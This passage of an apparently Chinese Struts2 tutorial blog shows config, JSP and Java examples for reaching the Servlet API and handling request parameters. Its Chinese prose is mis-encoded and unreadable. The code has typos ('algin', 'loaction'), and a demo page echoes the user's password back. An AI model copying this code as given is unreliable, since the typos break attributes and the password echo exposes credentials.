class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-comment">&lt;!-- æŒ‡å®šStruts2é…ç½®æ–‡ä»¶çš„D2Tä¿¡æ¯ --&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;LoginDemo&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span>&gt;</span>/error.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>login.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ç™»é™†é¡µé¢<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>è´¦å·:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>å¯†ç :<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ç™»é™†&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>success.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ç™»é™†æˆåŠŸé¡µé¢<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">algin</span>=<span class="hljs-string">center</span>&gt;</span>é€šè¿‡ActionContextç±»è®¿é—®Servelt API<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>$&#123;success &#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>ç”¨æˆ·ç™»å½•ä¿¡æ¯<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>ç”¨æˆ·å:$&#123;username &#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>å¯†    ç :$&#123;password &#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>error.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ç™»é™†å¤±è´¥é¡µé¢<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>$&#123;error &#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å‘å¸ƒé¡¹ç›®è®¿é—®login.jsp<br><img src="https://img-blog.csdnimg.cn/20210326201914583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¾“å…¥é”™è¯¯çš„è´¦å·å¯†ç ï¼Œæç¤ºç™»é™†å¤±è´¥<br><img src="https://img-blog.csdnimg.cn/20210326201922847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åadminå’Œå¯†ç 123456ï¼Œæç¤ºç™»é™†æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/20210326201939672.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä»è¿”å›ç”¨æˆ·ä¿¡æ¯ï¼Œå¯ä»¥çœ‹å‡ºæ¥ï¼Œåœ¨Actionä¸­æ”¾å…¥ActionContextçš„key-valueé”®å€¼å¯¹è¢«æå–å‡ºæ¥äº†ï¼Œè¯´æ˜struts2å¯ä»¥é€šè¿‡ActionContextç±»è®¿é—®Servlet APIã€‚</p><h3 id="é€šè¿‡ç‰¹å®šæ¥å£è®¿é—®"><a href="#é€šè¿‡ç‰¹å®šæ¥å£è®¿é—®" class="headerlink" title="é€šè¿‡ç‰¹å®šæ¥å£è®¿é—®"></a>é€šè¿‡ç‰¹å®šæ¥å£è®¿é—®</h3><p>Struts2æ¡†æ¶æä¾›äº†ActionContextæ¥è®¿é—®Servlet APIï¼Œä½†æ— æ³•ç›´æ¥è·å¾—Servlet APIå®ä¾‹ï¼ŒStruts2æä¾›å¦‚ä¸‹å‡ ä¸ªæ¥å£ä½¿Actionå¯ä»¥ç›´æ¥è®¿é—®åˆ°Servlet APIï¼š</p><table><thead><tr><th>æ¥å£</th><th>åŠŸèƒ½æè¿°</th></tr></thead><tbody><tr><td>ServletContextAware</td><td>å®ç°è¯¥æ¥å£çš„Actionå¯ä»¥ç›´æ¥è®¿é—®Webåº”ç”¨çš„ServletContextå®ä¾‹</td></tr><tr><td>ServletRequestAware</td><td>å®ç°è¯¥æ¥å£çš„Actionå¯ä»¥ç›´æ¥è®¿é—®Webåº”ç”¨çš„ServletRequestå®ä¾‹</td></tr><tr><td>ServletResponseAware:</td><td>å®ç°è¯¥æ¥å£çš„Actionå¯ä»¥ç›´æ¥è®¿é—®Webåº”ç”¨çš„ServletRsponseå®ä¾‹</td></tr></tbody></table><p>å®ä¾‹2ï¼š</p><p>AwareAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><br><span class="hljs-keyword">import</span> org.apache.struts2.interceptor.ServletRequestAware;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AwareAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ServletRequestAware</span></span>&#123;<br>HttpServletRequest request;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setServletRequest</span><span class="hljs-params">(HttpServletRequest request)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.request=request;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;é€šè¿‡ServletRequestAwareæ¥å£å®ç°äº†è®¿é—®Servlet APIçš„è®¿é—®&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>struts.xmlé…ç½®</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;AwareDemo&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;aware&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.AwareAction&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/message.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>message.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">algin</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span>$&#123;requestScope.message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å‘å¸ƒé¡¹ç›®ï¼Œè®¿é—®aware<br><img src="https://img-blog.csdnimg.cn/20210326204201290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯ä»¥çœ‹å‡ºï¼Œä½¿ç”¨ServletRequestAwareæ¥å£é¡ºåˆ©è®¿é—®Servlet APIäº†çš„</p><h3 id="é€šè¿‡ServletActionContextè®¿é—®"><a href="#é€šè¿‡ServletActionContextè®¿é—®" class="headerlink" title="é€šè¿‡ServletActionContextè®¿é—®"></a>é€šè¿‡ServletActionContextè®¿é—®</h3><p>Struts2è¿˜æä¾›äº†ä¸€ä¸ªServletActionContextå·¥å…·ç±»ç”¨æ¥è®¿é—®Servlet APIã€‚è¯¥ç±»åŒ…å«äº†ä¸€ä¸‹å‡ ä¸ªé™æ€æ–¹æ³•ï¼š</p><table><thead><tr><th>æ–¹æ³•</th><th>æè¿°</th></tr></thead><tbody><tr><td>static PageContext getPageContext()</td><td>å–å¾—Webåº”ç”¨çš„PageContextå¯¹è±¡</td></tr><tr><td>static HttpServletRequest getRequest()</td><td>å–å¾—Webåº”ç”¨çš„?HttpServletRequestå¯¹è±¡</td></tr><tr><td>static HttpServletResponse getResponse()</td><td>å–å¾—Webåº”ç”¨çš„HttpServletResponseå¯¹è±¡</td></tr><tr><td>static ServletContext getServletContext()</td><td>å–å¾—Webåº”ç”¨çš„ServletContextå¯¹è±¡</td></tr></tbody></table><p>å®ä¾‹3ï¼š<br>ContextAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><br><span class="hljs-keyword">import</span> org.apache.struts2.ServletActionContext;<br><span class="hljs-keyword">import</span> org.apache.struts2.interceptor.ServletRequestAware;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ContextAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> </span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>ServletActionContext.getRequest().setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <br><span class="hljs-string">&quot;é€šè¿‡ServletActionContextç±»ç›´æ¥è®¿é—®Servlet API&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br><br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>struts.xmlé…ç½®</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ContextDemo&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;context&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.ContextAction&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/context.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>context.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">algin</span>=<span class="hljs-string">center</span>&gt;</span>$&#123;requestScope.message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å‘å¸ƒé¡¹ç›®ï¼Œè®¿é—®context<br><img src="https://img-blog.csdnimg.cn/20210326204934276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å€ŸåŠ©ServletActionContextç±»çš„å¸®åŠ©ï¼Œä¹Ÿå¯ä»¥åœ¨Actionä¸­ç›´æ¥è®¿é—®Servlet APIï¼Œé¿å…äº†Actionå®ç°AxxActionç­‰æ¥å£ã€‚</p><p>åœ¨å¼€å‘ä¸­åº”ä¼˜å…ˆä½¿ç”¨ActionContextæ¥é¿å…å’ŒServlet APIè€¦åˆ</p><h2 id="Acitonå¤„ç†è¯·æ±‚å‚æ•°"><a href="#Acitonå¤„ç†è¯·æ±‚å‚æ•°" class="headerlink" title="Acitonå¤„ç†è¯·æ±‚å‚æ•°"></a>Acitonå¤„ç†è¯·æ±‚å‚æ•°</h2><p>åœ¨Struts2ä¸­ï¼Œé¡µé¢çš„è¯·æ±‚æ•°æ®å’ŒActionæœ‰ä¸¤ç§åŸºæœ¬çš„å¯¹åº”æ–¹å¼ï¼Œåˆ†åˆ«æ˜¯å­—æ®µé©±åŠ¨(FileldDriven)æ–¹å¼å’Œæ¨¡å‹é©±åŠ¨(ModelDriven)æ–¹å¼ã€‚å…¶ä¸­ï¼Œå­—æ®µé©±åŠ¨ä¹Ÿå«åšä¸ºå±æ€§é©±åŠ¨ã€‚</p><h3 id="å±æ€§é©±åŠ¨"><a href="#å±æ€§é©±åŠ¨" class="headerlink" title="å±æ€§é©±åŠ¨"></a>å±æ€§é©±åŠ¨</h3><p>  1.åŸºæœ¬æ•°æ®ç±»å‹å­—æ®µé©±åŠ¨æ–¹å¼çš„æ•°æ®ä¼ é€’:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.hjc.Action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ActionOne</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> </span>&#123;<br><span class="hljs-keyword">private</span> String UserName;<br><span class="hljs-keyword">private</span> String PassWord;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUserName</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> UserName;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUserName</span><span class="hljs-params">(String userName)</span> </span>&#123;<br>UserName = userName;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassWord</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> PassWord;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPassWord</span><span class="hljs-params">(String passWord)</span> </span>&#123;<br>PassWord = passWord;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>  2.ç›´æ¥ä½¿ç”¨åŸŸå¯¹è±¡å­—æ®µé©±åŠ¨æ–¹å¼çš„æ•°æ®ä¼ é€’</p><h3 id="æ¨¡å‹é©±åŠ¨"><a href="#æ¨¡å‹é©±åŠ¨" class="headerlink" title="æ¨¡å‹é©±åŠ¨"></a>æ¨¡å‹é©±åŠ¨</h3><p>æ¨¡å‹é©±åŠ¨ï¼Œé€šè¿‡å®ç°ModelDrivenæ¥å£æ¥æ¥å—è¯·æ±‚å‚æ•°ï¼ŒActionç±»å¿…é¡»å®ç°æ¥å£ï¼Œå¹¶ä¸”è¦é‡å†™getModel()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›çš„å°±æ˜¯Actionæ‰€ä½¿ç”¨çš„æ•°æ®æ¨¡å‹å¯¹è±¡ã€‚</p><h2 id="Resultç»“æœç±»å‹"><a href="#Resultç»“æœç±»å‹" class="headerlink" title="Resultç»“æœç±»å‹"></a>Resultç»“æœç±»å‹</h2><h3 id="é…ç½®-Result"><a href="#é…ç½®-Result" class="headerlink" title="é…ç½® Result"></a>é…ç½® Result</h3><p>resultæ ‡ç­¾çš„å±æ€§ï¼š</p><ul><li>nameå±æ€§ï¼šæŒ‡å®šé€»è¾‘è§†å›¾çš„åç§°ï¼Œé»˜è®¤ä¸ºsuccessã€‚</li><li>type å±æ€§ï¼šæŒ‡å®šè¿”å›çš„è§†å›¾èµ„æºçš„ç±»å‹ï¼Œä¸åŒçš„ç±»å‹ä»£è¡¨ä¸åŒçš„ç»“æœè¾“å‡ºï¼Œé»˜è®¤å€¼æ˜¯dispatcherã€‚</li></ul><p>struts.xmlæ–‡ä»¶ä¸­<code>&lt;result&gt;</code>å…ƒç´ é…ç½®ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;loginAction&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;redirect&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;loaction&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸Šè¿°é…ç½®ï¼Œä½¿ç”¨äº†<code>&lt;result&gt;</code>å…ƒç´ çš„nameã€typeå±æ€§å’Œparamå­å…ƒç´ ã€‚</p><p><code>&lt;param&gt;</code>å­å…ƒç´ 